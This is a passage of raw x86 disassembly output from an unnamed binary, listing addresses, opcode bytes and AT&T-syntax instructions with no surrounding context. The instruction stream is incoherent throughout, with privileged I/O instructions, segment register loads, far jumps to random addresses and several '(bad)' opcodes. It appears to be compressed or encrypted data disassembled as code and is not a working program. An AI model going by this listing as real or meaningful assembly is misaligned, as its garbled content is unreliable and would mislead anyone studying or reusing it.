  406649:	32 0c db             	xor    (%ebx,%ebx,8),%cl
  40664c:	45                   	inc    %ebp
  40664d:	d8 09                	fmuls  (%ecx)
  40664f:	8e dd                	mov    %ebp,%ds
  406651:	d1 05 7f 75 ec 41    	roll   $1,0x41ec757f
  406657:	fb                   	sti
  406658:	ae                   	scas   %es:(%edi),%al
  406659:	3b 7c e3 3f          	cmp    0x3f(%ebx,%eiz,8),%edi
  40665d:	39 e0                	cmp    %esp,%eax
  40665f:	00 d4                	add    %dl,%ah
  406661:	66 29 04 a2          	sub    %ax,(%edx,%eiz,4)
  406665:	f6 9f 3e f8 af 11    	negb   0x11aff83e(%edi)
  40666b:	9b                   	fwait
  40666c:	15 74 70 5b 45       	adc    $0x455b7074,%eax
  406671:	3e 0d 33 b8 7b e1    	ds or  $0xe17bb833,%eax
  406677:	33 fb                	xor    %ebx,%edi
  406679:	f9                   	stc
  40667a:	65 31 ff             	gs xor %edi,%edi
  40667d:	00 ed                	add    %ch,%ch
  40667f:	c7                   	(bad)
  406680:	30 29                	xor    %ch,(%ecx)
  406682:	51                   	push   %ecx
  406683:	d9 1b                	fstps  (%ebx)
  406685:	cd 77                	int    $0x77
  406687:	56                   	push   %esi
  406688:	16                   	push   %ss
  406689:	3e 89 8f 6c e2 0e e5 	mov    %ecx,%ds:-0x1af11d94(%edi)
  406690:	f3 64 93             	repz fs xchg %eax,%ebx
  406693:	2d 80 2a a2 26       	sub    $0x26a22a80,%eax
  406698:	17                   	pop    %ss
  406699:	fa                   	cli
  40669a:	4b                   	dec    %ebx
  40669b:	29 82 45 ed 9f d5    	sub    %eax,-0x2a6012bb(%edx)
  4066a1:	c5 8d 2d b4 8c e0    	lds    -0x1f734bd3(%ebp),%ecx
  4066a7:	6b 96 f7 21 12 0b 41 	imul   $0x41,0xb1221f7(%esi),%edx
  4066ae:	f9                   	stc
  4066af:	25 53 85 1d a7       	and    $0xa71d8553,%eax
  4066b4:	55                   	push   %ebp
  4066b5:	89 83 29 a0 6e 41    	mov    %eax,0x416ea029(%ebx)
  4066bb:	21 16                	and    %edx,(%esi)
  4066bd:	11 c2                	adc    %eax,%edx
  4066bf:	46                   	inc    %esi
  4066c0:	90                   	nop
  4066c1:	54                   	push   %esp
  4066c2:	81 37 6c 45 ed d9    	xorl   $0xd9ed456c,(%edi)
  4066c8:	57                   	push   %edi
  4066c9:	09 f0                	or     %esi,%eax
  4066cb:	9c                   	pushf
  4066cc:	1f                   	pop    %ds
  4066cd:	08 cd                	or     %cl,%ch
  4066cf:	d2 a0 56 a3 d7 58    	shlb   %cl,0x58d7a356(%eax)
  4066d5:	89 a1 6c 62 46 ed    	mov    %esp,-0x12b99d94(%ecx)
  4066db:	22 71 77             	and    0x77(%ecx),%dh
  4066de:	9d                   	popf
  4066df:	e7 64                	out    %eax,$0x64
  4066e1:	57                   	push   %edi
  4066e2:	e9 d2 8a 5c a8       	jmp    0xa89cf1b9
  4066e7:	6b 3d b3 a8 d2 e5 c4 	imul   $0xffffffc4,0xe5d2a8b3,%edi
  4066ee:	9b                   	fwait
  4066ef:	25 5b 9c 83 29       	and    $0x29839c5b,%eax
  4066f4:	7a ce                	jp     0x4066c4
  4066f6:	b7 31                	mov    $0x31,%bh
  4066f8:	a3 46 dc 94 c4       	mov    %eax,0xc494dc46
  4066fd:	90                   	nop
  4066fe:	15 f8 fe 8d e1       	adc    $0xe18dfef8,%eax
  406703:	e4 89                	in     $0x89,%al
  406705:	c3                   	ret
  406706:	f8                   	clc
  406707:	c9                   	leave
  406708:	98                   	cwtl
  406709:	ec                   	in     (%dx),%al
  40670a:	24 f4                	and    $0xf4,%al
  40670c:	2c e5                	sub    $0xe5,%al
  40670e:	44                   	inc    %esp
  40670f:	c1 50 ca cd          	rcll   $0xcd,-0x36(%eax)
  406713:	6b 67 db a6          	imul   $0xffffffa6,-0x25(%edi),%esp
  406717:	47                   	inc    %edi
  406718:	f2 ba 17 92 b2 66    	repnz mov $0x66b29217,%edx
  40671e:	a1 a2 86 2b db       	mov    0xdb2b86a2,%eax
  406723:	ca 22 30             	lret   $0x3022
  406726:	eb f5                	jmp    0x40671d
  406728:	92                   	xchg   %eax,%edx
  406729:	ac                   	lods   %ds:(%esi),%al
  40672a:	45                   	inc    %ebp
  40672b:	ab                   	stos   %eax,%es:(%edi)
  40672c:	d3 ab 53 e9 f5 b8    	shrl   %cl,-0x470a16ad(%ebx)
  406732:	93                   	xchg   %eax,%ebx
  406733:	16                   	push   %ss
  406734:	a3 0a 4b af 0a       	mov    %eax,0xaaf4b0a
  406739:	ec                   	in     (%dx),%al
  40673a:	9c                   	pushf
  40673b:	84 e3                	test   %ah,%bl
  40673d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40673e:	f9                   	stc
  40673f:	03 88 ad ba 47 b9    	add    -0x46b84553(%eax),%ecx
  406745:	c4 70 08             	les    0x8(%eax),%esi
  406748:	54                   	push   %esp
  406749:	5c                   	pop    %esp
  40674a:	07                   	pop    %es
  40674b:	0c 14                	or     $0x14,%al
  40674d:	14 15                	adc    $0x15,%al
  40674f:	43                   	inc    %ebx
  406750:	84 16                	test   %dl,(%esi)
  406752:	6b 99 82 62 cc 2b 31 	imul   $0x31,0x2bcc6282(%ecx),%ebx
  406759:	4d                   	dec    %ebp
  40675a:	57                   	push   %edi
  40675b:	d7                   	xlat   %ds:(%ebx)
  40675c:	0c 10                	or     $0x10,%al
  40675e:	46                   	inc    %esi
  40675f:	b1 39                	mov    $0x39,%cl
  406761:	76 4d                	jbe    0x4067b0
  406763:	4e                   	dec    %esi
  406764:	2b f1                	sub    %ecx,%esi
  406766:	2e ab                	cs stos %eax,%es:(%edi)
  406768:	70 da                	jo     0x406744
  40676a:	79 8a                	jns    0x4066f6
  40676c:	ca 3a ec             	lret   $0xec3a
  40676f:	fa                   	cli
  406770:	64 47                	fs inc %edi
  406772:	51                   	push   %ecx
  406773:	f2 a6                	repnz cmpsb %es:(%edi),%ds:(%esi)
  406775:	54                   	push   %esp
  406776:	15 de 85 46 93       	adc    $0x934685de,%eax
  40677b:	51                   	push   %ecx
  40677c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40677d:	02 6f 61             	add    0x61(%edi),%ch
  406780:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406781:	7d 77                	jge    0x4067fa
  406783:	0e                   	push   %cs
  406784:	44                   	inc    %esp
  406785:	da 7d 89             	fidivrl -0x77(%ebp)
  406788:	8d 6c fa 14          	lea    0x14(%edx,%edi,8),%ebp
  40678c:	78 6e                	js     0x4067fc
  40678e:	f9                   	stc
  40678f:	8a 44 f9 3a          	mov    0x3a(%ecx,%edi,8),%al
  406793:	31 cd                	xor    %ecx,%ebp
  406795:	57                   	push   %edi
  406796:	91                   	xchg   %eax,%ecx
  406797:	eb 2d                	jmp    0x4067c6
  406799:	be 6b 10 57 4e       	mov    $0x4e57106b,%esi
  40679e:	b0 f3                	mov    $0xf3,%al
  4067a0:	ac                   	lods   %ds:(%esi),%al
  4067a1:	46                   	inc    %esi
  4067a2:	ee                   	out    %al,(%dx)
  4067a3:	3a 24 ba             	cmp    (%edx,%edi,4),%ah
  4067a6:	8c 62 b8             	mov    %fs,-0x48(%edx)
  4067a9:	1b 86 3e d8 9f 46    	sbb    0x469fd83e(%esi),%eax
  4067af:	1f                   	pop    %ds
  4067b0:	56                   	push   %esi
  4067b1:	e2 04                	loop   0x4067b7
  4067b3:	12 84 fb a2 6f 36 d7 	adc    -0x28c9905e(%ebx,%edi,8),%al
  4067ba:	b6 04                	mov    $0x4,%dh
  4067bc:	4e                   	dec    %esi
  4067bd:	ac                   	lods   %ds:(%esi),%al
  4067be:	6f                   	outsl  %ds:(%esi),(%dx)
  4067bf:	17                   	pop    %ss
  4067c0:	11 1d 01 d9 e3 8e    	adc    %ebx,0x8ee3d901
  4067c6:	c4 84 9c 07 10 ad 37 	les    0x37ad1007(%esp,%ebx,4),%eax
  4067cd:	7c 8d                	jl     0x40675c
  4067cf:	ef                   	out    %eax,(%dx)
  4067d0:	55                   	push   %ebp
  4067d1:	29 1e                	sub    %ebx,(%esi)
  4067d3:	45                   	inc    %ebp
  4067d4:	32 81 23 82 bf 36    	xor    0x36bf8223(%ecx),%al
  4067da:	06                   	push   %es
  4067db:	0a 4e 36             	or     0x36(%esi),%cl
  4067de:	e1 29                	loope  0x406809
  4067e0:	64 5c                	fs pop %esp
  4067e2:	12 ce                	adc    %dh,%cl
  4067e4:	e4 5c                	in     $0x5c,%al
  4067e6:	28 a8 af 62 15 4e    	sub    %ch,0x4e1562af(%eax)
  4067ec:	e9 84 4e ca 9d       	jmp    0x9e0ab675
  4067f1:	f8                   	clc
  4067f2:	cf                   	iret
  4067f3:	dd bb d2 86 21 73    	fnstsw 0x732186d2(%ebx)
  4067f9:	d5 39                	aad    $0x39
  4067fb:	93                   	xchg   %eax,%ebx
  4067fc:	91                   	xchg   %eax,%ecx
  4067fd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4067fe:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4067ff:	bc af 83 42 88       	mov    $0x884283af,%esp
  406804:	08 b9 5c 17 7c 19    	or     %bh,0x197c175c(%ecx)
  40680a:	27                   	daa
  40680b:	ea 3e ff 00 3f b7 16 	ljmp   $0x16b7,$0x3f00ff3e
  406812:	69 8e f4 07 7a d8 18 	imul   $0x20b55018,-0x2785f80c(%esi),%ecx
  406819:	50 b5 20 
  40681c:	5b                   	pop    %ebx
  40681d:	1f                   	pop    %ds
  40681e:	c0 82 4a 28 64 83 9e 	rolb   $0x9e,-0x7c9bd7b6(%edx)
  406825:	e5 e4                	in     $0xe4,%eax
  406827:	88 64 83 fd          	mov    %ah,-0x3(%ebx,%eax,4)
  40682b:	23 8e eb 8f 8e 20    	and    0x208e8feb(%esi),%ecx
  406831:	1a 8a c5 ac 5e c8    	sbb    -0x37a1533b(%edx),%cl
  406837:	5c                   	pop    %esp
  406838:	30 9c 36 4a 4c 65 6e 	xor    %bl,0x6e654c4a(%esi,%esi,1)
  40683f:	43                   	inc    %ebx
  406840:	2d e3 ad d3 54       	sub    $0x54d3ade3,%eax
  406845:	ea c7 42 5c 0f 55 b5 	ljmp   $0xb555,$0xf5c42c7
  40684c:	5c                   	pop    %esp
  40684d:	a0 f5 37 26 71       	mov    0x712637f5,%al
  406852:	f3 f3 c5 c2 16       	(bad)
  406857:	52                   	push   %edx
  406858:	c3                   	ret
  406859:	79 57                	jns    0x4068b2
  40685b:	5f                   	pop    %edi
  40685c:	08 a5 4a 1a 72 86    	or     %ah,-0x798de5b6(%ebp)
  406862:	e7 18                	out    %eax,$0x18
  406864:	13 24 21             	adc    (%ecx,%eiz,1),%esp
  406867:	14 25                	adc    $0x25,%al
  406869:	4c                   	dec    %esp
  40686a:	67 b2 2a             	addr16 mov $0x2a,%dl
  40686d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40686e:	57                   	push   %edi
  40686f:	28 b9 5f d2 a4 bd    	sub    %bh,-0x425b2da1(%ecx)
  406875:	b1 f7                	mov    $0xf7,%cl
  406877:	e2 94                	loop   0x40680d
  406879:	14 a7                	adc    $0xa7,%al
  40687b:	28 bd 39 d3 7a 17    	sub    %bh,0x177ad339(%ebp)
  406881:	d2 e0                	shl    %cl,%al
  406883:	cd ae                	int    $0xae
  406885:	4c                   	dec    %esp
  406886:	4a                   	dec    %edx
  406887:	3c 0e                	cmp    $0xe,%al
  406889:	bb b5 59 9b 58       	mov    $0x589b59b5,%ebx
  40688e:	81 18 1f 30 49 d2    	sbbl   $0xd249301f,(%eax)
  406894:	00 c5                	add    %al,%ch
  406896:	12 9e e2 11 26 f7    	adc    -0x8d9ee1e(%esi),%bl
  40689c:	8d 7b 34             	lea    0x34(%ebx),%edi
  40689f:	8b f5                	mov    %ebp,%esi
  4068a1:	3b b4 7e fc 5e 4a b4 	cmp    -0x4bb5a104(%esi,%edi,2),%esi
  4068a8:	c6                   	(bad)
  4068a9:	e8 94 9b e6 64       	call   0x65270442
  4068ae:	b9 f1 78 7f 4f       	mov    $0x4f7f78f1,%ecx
  4068b3:	8c 0d a8 82 e2 32    	mov    %cs,0x32e282a8
  4068b9:	5d                   	pop    %ebp
  4068ba:	63 b6 da a6 d3 a4    	arpl   %esi,-0x5b2c5926(%esi)
  4068c0:	54                   	push   %esp
  4068c1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4068c2:	48                   	dec    %eax
  4068c3:	b9 db aa 8d 0e       	mov    $0xe8daadb,%ecx
  4068c8:	87 15 f9 95 b6 a0    	xchg   %edx,0xa0b695f9
  4068ce:	80 85 40 d5 a3 18 d1 	addb   $0xd1,0x18a3d540(%ebp)
  4068d5:	69 21 22 58 a8 40    	imul   $0x40a85822,(%ecx),%esp
  4068db:	75 fa                	jne    0x4068d7
  4068dd:	83 8c b2 a6 e2 12 b6 	orl    $0xffffff8a,-0x49ed1d5a(%edx,%esi,4)
  4068e4:	8a 
  4068e5:	66 0d 99 88          	or     $0x8899,%ax
  4068e9:	81 5e 54 bd f6 33 49 	sbbl   $0x4933f6bd,0x54(%esi)
  4068f0:	b2 50                	mov    $0x50,%dl
  4068f2:	a9 ed ec a7 85       	test   $0x85a7eced,%eax
  4068f7:	4e                   	dec    %esi
  4068f8:	5e                   	pop    %esi
  4068f9:	11 25 85 05 35 68    	adc    %esp,0x68350585
  4068ff:	2d d2 39 86 d4       	sub    $0xd48639d2,%eax
  406904:	bb 3e a7 ef ac       	mov    $0xacefa73e,%ebx
  406909:	fa                   	cli
  40690a:	a0 52 ad c4 72       	mov    0x72c4ad52,%al
  40690f:	4a                   	dec    %edx
  406910:	d1 ed                	shr    $1,%ebp
  406912:	0a 8a 25 c9 44 a6    	or     -0x59bb36db(%edx),%cl
  406918:	41                   	inc    %ecx
  406919:	70 41                	jo     0x40695c
  40691b:	85 a3 be 55 84 37    	test   %esp,0x378455be(%ebx)
  406921:	6a 80                	push   $0xffffff80
  406923:	11 9b 64 1c 37 88    	adc    %ebx,-0x77c8e39c(%ebx)
  406929:	91                   	xchg   %eax,%ecx
  40692a:	fd                   	std
  40692b:	bb cc 53 76 38       	mov    $0x387653cc,%ebx
  406930:	76 5e                	jbe    0x406990
  406932:	d8 c6                	fadd   %st(6),%st
  406934:	e1 c8                	loope  0x4068fe
  406936:	32 66 5b             	xor    0x5b(%esi),%ah
  406939:	28 68 87             	sub    %ch,-0x79(%eax)
  40693c:	35 03 4b 77 b3       	xor    $0xb3774b03,%eax
  406941:	d2 24 21             	shlb   %cl,(%ecx,%eiz,1)
  406944:	51                   	push   %ecx
  406945:	c4 6b f5             	les    -0xb(%ebx),%ebp
  406948:	6f                   	outsl  %ds:(%esi),(%dx)
  406949:	78 41                	js     0x40698c
  40694b:	6a d2                	push   $0xffffffd2
  40694d:	d7                   	xlat   %ds:(%ebx)
  40694e:	ad                   	lods   %ds:(%esi),%eax
  40694f:	35 85 4f a1 d2       	xor    $0xd2a14f85,%eax
  406954:	af                   	scas   %es:(%edi),%eax
  406955:	0a 24 7b             	or     (%ebx,%edi,2),%ah
  406958:	8e 45 cf             	mov    -0x31(%ebp),%es
  40695b:	50                   	push   %eax
  40695c:	6e                   	outsb  %ds:(%esi),(%dx)
  40695d:	b7 a8                	mov    $0xa8,%bh
  40695f:	b2 9f                	mov    $0x9f,%dl
  406961:	b0 28                	mov    $0x28,%al
  406963:	4d                   	dec    %ebp
  406964:	d2 28                	shrb   %cl,(%eax)
  406966:	55                   	push   %ebp
  406967:	38 95 a5 99 4d 89    	cmp    %dl,-0x76b2665b(%ebp)
  40696d:	6a c7                	push   $0xffffffc7
  40696f:	62 67 56             	bound  %esp,0x56(%edi)
  406972:	65 39 f8             	gs cmp %edi,%eax
  406975:	4d                   	dec    %ebp
  406976:	36 d5 4d             	ss aad $0x4d
  406979:	b0 8d                	mov    $0x8d,%al
  40697b:	15 83 69 cf 6d       	adc    $0x6dcf6983,%eax
  406980:	19 92 0f ce e3 4a    	sbb    %edx,0x4ae3ce0f(%edx)
  406986:	46                   	inc    %esi
  406987:	d8 c3                	fadd   %st(3),%st
  406989:	84 45 c4             	test   %al,-0x3c(%ebp)
  40698c:	27                   	daa
  40698d:	48                   	dec    %eax
  40698e:	f3 37                	repz aaa
  406990:	9c                   	pushf
  406991:	aa                   	stos   %al,%es:(%edi)
  406992:	2d 17 3c a8 be       	sub    $0xbea83c17,%eax
  406997:	ce                   	into
  406998:	e9 a5 be 88 84       	jmp    0x84c92842
  40699d:	cc                   	int3
  40699e:	89 b5 21 42 d9 51    	mov    %esi,0x51d94221(%ebp)
  4069a4:	6d                   	insl   (%dx),%es:(%edi)
  4069a5:	75 e5                	jne    0x40698c
  4069a7:	c2 7f 28             	ret    $0x287f
  4069aa:	b8 b7 df 3e 76       	mov    $0x763edfb7,%eax
  4069af:	75 c7                	jne    0x406978
  4069b1:	70 52                	jo     0x406a05
  4069b3:	22 d0                	and    %al,%dl
  4069b5:	f5                   	cmc
  4069b6:	3a e0                	cmp    %al,%ah
  4069b8:	a0 db 93 21 d6       	mov    0xd62193db,%al
  4069bd:	2d 7b c6 b3 0e       	sub    $0xeb3c67b,%eax
  4069c2:	c1 ac 4f b8 ea 76 4b 	shrl   $0x8b,0x4b76eab8(%edi,%ecx,2)
  4069c9:	8b 
  4069ca:	0b f0                	or     %eax,%esi
  4069cc:	5a                   	pop    %edx
  4069cd:	6c                   	insb   (%dx),%es:(%edi)
  4069ce:	ca 84 f9             	lret   $0xf984
  4069d1:	cc                   	int3
  4069d2:	ca 97 56             	lret   $0x5697
  4069d5:	83 2d 99 d2 a9 a7 11 	subl   $0x11,0xa7a9d299
  4069dc:	ca 72 53             	lret   $0x5372
  4069df:	de 79 9e             	fidivrs -0x62(%ecx)
  4069e2:	83 ec 90             	sub    $0xffffff90,%esp
  4069e5:	99                   	cltd
  4069e6:	70 f4                	jo     0x4069dc
  4069e8:	ed                   	in     (%dx),%eax
  4069e9:	b9 83 b9 44 99       	mov    $0x9944b983,%ecx
  4069ee:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4069ef:	c0 5a ac c8          	rcrb   $0xc8,-0x54(%edx)
  4069f3:	6b 4f 8f e9          	imul   $0xffffffe9,-0x71(%edi),%ecx
  4069f7:	ca 18 12             	lret   $0x1218
  4069fa:	d9 c9                	fxch   %st(1)
  4069fc:	bd 9a 8c 28 d4       	mov    $0xd4288c9a,%ebp
  406a01:	d5 bc                	aad    $0xbc
  406a03:	f6 c4 1f             	test   $0x1f,%ah
  406a06:	9b                   	fwait
  406a07:	ff 00                	incl   (%eax)
  406a09:	51                   	push   %ecx
  406a0a:	78 fc                	js     0x406a08
  406a0c:	c1 59 56 16          	rcrl   $0x16,0x56(%ecx)
  406a10:	84 59 96             	test   %bl,-0x6a(%ecx)
  406a13:	6d                   	insl   (%dx),%es:(%edi)
  406a14:	65 cb                	gs lret
  406a16:	4a                   	dec    %edx
  406a17:	cd af                	int    $0xaf
  406a19:	d0 6a b7             	shrb   $1,-0x49(%edx)
  406a1c:	0e                   	push   %cs
  406a1d:	b5 6b                	mov    $0x6b,%ch
  406a1f:	2f                   	das
  406a20:	e1 75                	loope  0x406a97
  406a22:	8e 60 f5             	mov    -0xb(%eax),%fs
  406a25:	2e 45                	cs inc %ebp
  406a27:	b9 6e 0d ad 6e       	mov    $0x6ead0d6e,%ecx
  406a2c:	52                   	push   %edx
  406a2d:	26 47                	es inc %edi
  406a2f:	a2 17 e0 da 69       	mov    %al,0x69dae017
  406a34:	64 51                	fs push %ecx
  406a36:	e9 93 ea cd 43       	jmp    0x440e54ce
  406a3b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406a3c:	d2 86 4c f9 fb da    	rolb   %cl,-0x250406b4(%esi)
  406a42:	95                   	xchg   %eax,%ebp
  406a43:	5d                   	pop    %ebp
  406a44:	ac                   	lods   %ds:(%esi),%al
  406a45:	d4 a4                	aam    $0xa4
  406a47:	0a 23                	or     (%ebx),%ah
  406a49:	59                   	pop    %ecx
  406a4a:	33 f6                	xor    %esi,%esi
  406a4c:	bc c9 d3 64 a0       	mov    $0xa064d3c9,%esp
  406a51:	ac                   	lods   %ds:(%esi),%al
  406a52:	b9 2a cb 5b b5       	mov    $0xb55bcb2a,%ecx
  406a57:	ec                   	in     (%dx),%al
  406a58:	f7 71 1e             	divl   0x1e(%ecx)
  406a5b:	d3 e9                	shr    %cl,%ecx
  406a5d:	47                   	inc    %edi
  406a5e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406a5f:	a8 9b                	test   $0x9b,%al
  406a61:	2d 82 ae 4a a6       	sub    $0xa64aae82,%eax
  406a66:	9d                   	popf
  406a67:	ad                   	lods   %ds:(%esi),%eax
  406a68:	ed                   	in     (%dx),%eax
  406a69:	1f                   	pop    %ds
  406a6a:	74 56                	je     0x406ac2
  406a6c:	aa                   	stos   %al,%es:(%edi)
  406a6d:	5d                   	pop    %ebp
  406a6e:	19 c9                	sbb    %ecx,%ecx
  406a70:	20 f2                	and    %dh,%dl
  406a72:	3e 4e                	ds dec %esi
  406a74:	20 12                	and    %dl,(%edx)
  406a76:	02 20                	add    (%eax),%ah
  406a78:	8e 45 30             	mov    0x30(%ebp),%es
  406a7b:	bd d5 5d 02 4d       	mov    $0x4d025dd5,%ebp
  406a80:	c8 28 88 3f          	enter  $0x8828,$0x3f
  406a84:	1d f2 5f ab 8e       	sbb    $0x8eab5ff2,%eax
  406a89:	85 14 1a             	test   %edx,(%edx,%ebx,1)
  406a8c:	86 c8                	xchg   %cl,%al
  406a8e:	47                   	inc    %edi
  406a8f:	38 48 39             	cmp    %cl,0x39(%eax)
  406a92:	83 c3 0e             	add    $0xe,%ebx
  406a95:	b2 68                	mov    $0x68,%dl
  406a97:	d1 a2 b2 2a 44 98    	shll   $1,-0x67bbd54e(%edx)
  406a9d:	54                   	push   %esp
  406a9e:	dc c2                	fadd   %st,%st(2)
  406aa0:	34 a8                	xor    $0xa8,%al
  406aa2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406aa3:	3d be a7 50 72       	cmp    $0x7250a7be,%eax
  406aa8:	a8 8b                	test   $0x8b,%al
  406aaa:	db b9 7d be 9e 0e    	fstpt  0xe9ebe7d(%ecx)
  406ab0:	02 05 19 40 a1 82    	add    0x82a14019,%al
  406ab6:	53                   	push   %ebx
  406ab7:	8c b2 9d 20 22 2d    	mov    %?,0x2d22209d(%edx)
  406abd:	ab                   	stos   %eax,%es:(%edi)
  406abe:	bb 0a 9e 28 7f       	mov    $0x7f289e0a,%ebx
  406ac3:	0a 83 b1 7e 8f d9    	or     -0x2670814f(%ebx),%al
  406ac9:	73 df                	jae    0x406aaa
  406acb:	8b 09                	mov    (%ecx),%ecx
  406acd:	8b a0 6d 63 c0 1a    	mov    0x1ac0636d(%eax),%esp
  406ad3:	8a 44 fb 49          	mov    0x49(%ebx,%edi,8),%al
  406ad7:	2c b9                	sub    $0xb9,%al
  406ad9:	5a                   	pop    %edx
  406ada:	9d                   	popf
  406adb:	7f db                	jg     0x406ab8
  406add:	16                   	push   %ss
  406ade:	2b 2e                	sub    (%esi),%ebp
  406ae0:	b8 cb 75 ca 93       	mov    $0x93ca75cb,%eax
  406ae5:	6b 52 9c 80          	imul   $0xffffff80,-0x64(%edx),%edx
  406ae9:	04 fd                	add    $0xfd,%al
  406aeb:	26 de 88 27 3a bd 58 	fimuls %es:0x58bd3a27(%eax)
  406af2:	24 77                	and    $0x77,%al
  406af4:	00 f1                	add    %dh,%cl
  406af6:	45                   	inc    %ebp
  406af7:	a3 44 9c f8 8f       	mov    %eax,0x8ff89c44
  406afc:	eb 26                	jmp    0x406b24
  406afe:	45                   	inc    %ebp
  406aff:	af                   	scas   %es:(%edi),%eax
  406b00:	a9 47 8b 34 fe       	test   $0xfe348b47,%eax
  406b05:	8e 5b b3             	mov    -0x4d(%ebx),%ds
  406b08:	1c 80                	sbb    $0x80,%al
  406b0a:	f3 ed                	repz in (%dx),%eax
  406b0c:	43                   	inc    %ebx
  406b0d:	18 7c 29 c4          	sbb    %bh,-0x3c(%ecx,%ebp,1)
  406b11:	e2 24                	loop   0x406b37
  406b13:	c9                   	leave
  406b14:	51                   	push   %ecx
  406b15:	9c                   	pushf
  406b16:	c6                   	(bad)
  406b17:	de 3d d1 d6 3f 34    	fidivrs 0x343fd6d1
  406b1d:	55                   	push   %ebp
  406b1e:	bd d1 b2 1a a9       	mov    $0xa91ab2d1,%ebp
  406b23:	aa                   	stos   %al,%es:(%edi)
  406b24:	56                   	push   %esi
  406b25:	fd                   	std
  406b26:	22 9a 74 6a 23 21    	and    0x21236a74(%edx),%bl
  406b2c:	0e                   	push   %cs
  406b2d:	05 2e 9f 4d a3       	add    $0xa34d9f2e,%eax
  406b32:	50                   	push   %eax
  406b33:	63 c4                	arpl   %eax,%esp
  406b35:	23 e9                	and    %ecx,%ebp
  406b37:	52                   	push   %edx
  406b38:	28 f0                	sub    %dh,%al
  406b3a:	60                   	pusha
  406b3b:	33 4f a7             	xor    -0x59(%edi),%ecx
  406b3e:	d3 5a 69             	rcrl   %cl,0x69(%edx)
  406b41:	c4 55 20             	les    0x20(%ebp),%edx
  406b44:	62 9d 1e 2b 3f 0b    	bound  %ebx,0xb3f2b1e(%ebp)
  406b4a:	b9 19 15 4d be       	mov    $0xbe4d1519,%ecx
  406b4f:	5c                   	pop    %esp
  406b50:	63 34 d0             	arpl   %esi,(%eax,%edx,8)
  406b53:	09 24 d1             	or     %esp,(%ecx,%edx,8)
  406b56:	9b                   	fwait
  406b57:	3b a3 be 0a aa 8a    	cmp    -0x7555f542(%ebx),%esp
  406b5d:	8a 2d 55 00 28 ec    	mov    0xec280055,%ch
  406b63:	50                   	push   %eax
  406b64:	2d 55 f8 2c 65       	sub    $0x652cf855,%eax
  406b69:	5e                   	pop    %esi
  406b6a:	a0 dd 27 26 6c       	mov    0x6c2627dd,%al
  406b6f:	f8                   	clc
  406b70:	e3 31                	jecxz  0x406ba3
  406b72:	05 e7 bf 38 e3       	add    $0xe338bfe7,%eax
  406b77:	22 29                	and    (%ecx),%ch
  406b79:	af                   	scas   %es:(%edi),%eax
  406b7a:	b7 45                	mov    $0x45,%bh
  406b7c:	dd db                	fstp   %st(3)
  406b7e:	e7 2a                	out    %eax,$0x2a
  406b80:	48                   	dec    %eax
  406b81:	b8 5c 26 57 77       	mov    $0x7757265c,%eax
  406b86:	cf                   	iret
  406b87:	19 33                	sbb    %esi,(%ebx)
  406b89:	26 12 cd             	es adc %ch,%cl
  406b8c:	5d                   	pop    %ebp
  406b8d:	e6 88                	out    %al,$0x88
  406b8f:	73 bb                	jae    0x406b4c
  406b91:	ae                   	scas   %es:(%edi),%al
  406b92:	50                   	push   %eax
  406b93:	3c 80                	cmp    $0x80,%al
  406b95:	92                   	xchg   %eax,%edx
  406b96:	11 53 a4             	adc    %edx,-0x5c(%ebx)
  406b99:	c1 1b 72             	rcrl   $0x72,(%ebx)
  406b9c:	b6 1a                	mov    $0x1a,%dh
  406b9e:	ec                   	in     (%dx),%al
  406b9f:	1c 19                	sbb    $0x19,%al
  406ba1:	09 29                	or     %ebp,(%ecx)
  406ba3:	63 62 65             	arpl   %esp,0x65(%edx)
  406ba6:	76 2a                	jbe    0x406bd2
  406ba8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ba9:	c2 a2 fc             	ret    $0xfca2
  406bac:	27                   	daa
  406bad:	df 6f 02             	fildll 0x2(%edi)
  406bb0:	a3 5b 90 c9 a0       	mov    %eax,0xa0c9905b
  406bb5:	6a 41                	push   $0x41
  406bb7:	6d                   	insl   (%dx),%es:(%edi)
  406bb8:	0d 20 c1 6a d3       	or     $0xd36ac120,%eax
  406bbd:	d5 e3                	aad    $0xe3
  406bbf:	60                   	pusha
  406bc0:	a2 42 6d f5 94       	mov    %al,0x94f56d42
  406bc5:	4b                   	dec    %ebx
  406bc6:	15 e6 fa 08 ae       	adc    $0xae08fae6,%eax
  406bcb:	11 13                	adc    %edx,(%ebx)
  406bcd:	4a                   	dec    %edx
  406bce:	3d 31 1f 8c 92       	cmp    $0x928c1f31,%eax
  406bd3:	6e                   	outsb  %ds:(%esi),(%dx)
  406bd4:	45                   	inc    %ebp
  406bd5:	24 ef                	and    $0xef,%al
  406bd7:	f5                   	cmc
  406bd8:	6d                   	insl   (%dx),%es:(%edi)
  406bd9:	e1 76                	loope  0x406c51
  406bdb:	04 bf                	add    $0xbf,%al
  406bdd:	8b 43 72             	mov    0x72(%ebx),%eax
  406be0:	d0 9a 5a 33 8d 4e    	rcrb   $1,0x4e8d335a(%edx)
  406be6:	e4 db                	in     $0xdb,%al
  406be8:	46                   	inc    %esi
  406be9:	e5 31                	in     $0x31,%eax
  406beb:	a9 74 67 aa 8e       	test   $0x8eaa6774,%eax
  406bf0:	c6                   	(bad)
  406bf1:	ab                   	stos   %eax,%es:(%edi)
  406bf2:	12 ca                	adc    %dl,%cl
  406bf4:	a2 34 74 a8 cd       	mov    %al,0xcda87434
  406bf9:	3d 25 f8 e4 de       	cmp    $0xdee4f825,%eax
  406bfe:	59                   	pop    %ecx
  406bff:	44                   	inc    %esp
  406c00:	6a 28                	push   $0x28
  406c02:	38 1d 77 04 9f 64    	cmp    %bl,0x649f0477
  406c08:	cd d3                	int    $0xd3
  406c0a:	32 20                	xor    (%eax),%ah
  406c0c:	58                   	pop    %eax
  406c0d:	cf                   	iret
  406c0e:	3a 47 b1             	cmp    -0x4f(%edi),%al
  406c11:	9d                   	popf
  406c12:	9c                   	pushf
  406c13:	37                   	aaa
  406c14:	87 4a 4c             	xchg   %ecx,0x4c(%edx)
  406c17:	cf                   	iret
